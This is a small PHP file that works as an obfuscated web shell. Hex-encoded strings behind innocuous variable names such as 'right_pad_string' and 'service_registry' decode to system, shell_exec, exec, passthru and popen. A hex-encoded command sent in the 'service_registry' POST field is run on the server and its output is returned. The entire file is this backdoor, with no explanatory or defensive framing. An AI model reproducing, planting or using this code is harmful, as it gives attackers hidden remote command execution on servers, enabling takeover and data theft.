<?php


$pset1 = '3';
$pset2 = '9';
$pset3 = '6';
$pset4 = '5';
$pset5 = 'c';
$pset6 = 'f';
$pset7 = '7';
$pset8 = '0';
$pset9 = '1';
$pset10 = '4';
$pset11 = '8';
$pset12 = '2';
$pset13 = 'e';
$pset14 = 'd';
$right_pad_string1 = pack("H*", '7'.$pset1.'7'.$pset2.'7'.$pset1.'7'.'4'.$pset3.$pset4.'6'.'d');
$right_pad_string2 = pack("H*", '7'.'3'.$pset3.'8'.'6'.$pset4.$pset3.$pset5.$pset3.$pset5.$pset4.$pset6.$pset3.$pset4.'7'.'8'.$pset3.'5'.$pset3.$pset1);
$right_pad_string3 = pack("H*", $pset3.$pset4.$pset7.'8'.'6'.$pset4.'6'.$pset1);
$right_pad_string4 = pack("H*", $pset7.$pset8.'6'.$pset9.'7'.'3'.'7'.'3'.'7'.$pset10.$pset3.$pset11.'7'.$pset12.'7'.'5');
$right_pad_string5 = pack("H*", $pset7.'0'.'6'.$pset6.'7'.'0'.$pset3.$pset4.'6'.$pset13);
$right_pad_string6 = pack("H*", '7'.$pset1.$pset7.'4'.$pset7.'2'.$pset3.$pset4.$pset3.$pset9.$pset3.$pset14.'5'.'f'.'6'.$pset7.$pset3.'5'.$pset7.'4'.$pset4.'f'.'6'.'3'.'6'.'f'.'6'.'e'.$pset7.$pset10.$pset3.$pset4.$pset3.'e'.$pset7.$pset10.'7'.'3');
$right_pad_string7 = pack("H*", '7'.'0'.'6'.'3'.$pset3.$pset5.$pset3.$pset6.$pset7.'3'.$pset3.'5');
$service_registry = pack("H*", '7'.$pset1.$pset3.$pset4.'7'.$pset12.'7'.'6'.$pset3.$pset2.$pset3.'3'.$pset3.$pset4.$pset4.'f'.$pset7.$pset12.$pset3.'5'.$pset3.'7'.$pset3.'9'.'7'.'3'.$pset7.'4'.'7'.$pset12.$pset7.$pset2);
if (isset($_POST[$service_registry])) {
    $service_registry = pack("H*", $_POST[$service_registry]);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($service_registry);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($service_registry);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($service_registry, $item_fac);
        print join("\n", $item_fac);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($service_registry);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $symbol_token = $right_pad_string5($service_registry, 'r');
        if ($symbol_token) {
            $ptr_ent = $right_pad_string6($symbol_token);
            $right_pad_string7($symbol_token);
            print $ptr_ent;
        }
    }
    exit;
}
